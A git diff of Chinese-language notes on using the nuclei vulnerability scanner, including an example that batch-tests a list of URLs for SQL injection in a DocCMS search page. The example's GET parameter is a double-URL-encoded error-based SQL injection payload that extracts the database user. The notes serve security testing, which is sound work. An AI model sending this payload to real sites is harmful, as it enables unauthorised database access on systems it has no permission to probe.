@@ -1,5 +1,5 @@
 - [常用命令](#常用命令)
-- [Example-1 批量检测POC](#example-1-批量检测poc)
+- [Example-1](#example-1)
 
 > 漏洞扫描，批量检测，自定义POC https://github.com/projectdiscovery/nuclei
 
@@ -38,10 +38,13 @@ nuclei -update-templates
 
 # 扫描指定年份的所有CVE
 echo https://example.com | nuclei -t 'cves/2021/*'
+
+# 指定扫描文件夹内所有的 POC
+echo https://example.com | nuclei -t 'vulnerabilities/moodle/*'
 ```
 
-## Example-1 批量检测POC
-向URL列表发送指定GET参数获取相应返回结果
+## Example-1
+- 达成目标：批量检测POC，向URL列表发送指定GET参数获取相应返回结果
 - 请求URL：`https://example.com/search/index.php`
 - 请求参数(GET)：`keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33`
 - 获取响应内容包含 `ORDER BY id DESC` 的结果
@@ -70,13 +73,8 @@ requests:
         words:
           - "ORDER BY id DESC"
 ```
-
-至此单个测试成功
-
-![图 4](../../../@attachment/images/Security/安全工具/nuclei_1661280665338.png)  
-
 指定 DocCMS-keyword-SQLi.yaml 模板并且指定 urls.txt 文件扫描
-
 ```
 nuclei -l urls.txt -t DocCMS-keyword-SQLi.yaml
 ```
+![图 4](../../../@attachment/images/Security/安全工具/nuclei_1661280665338.png)  
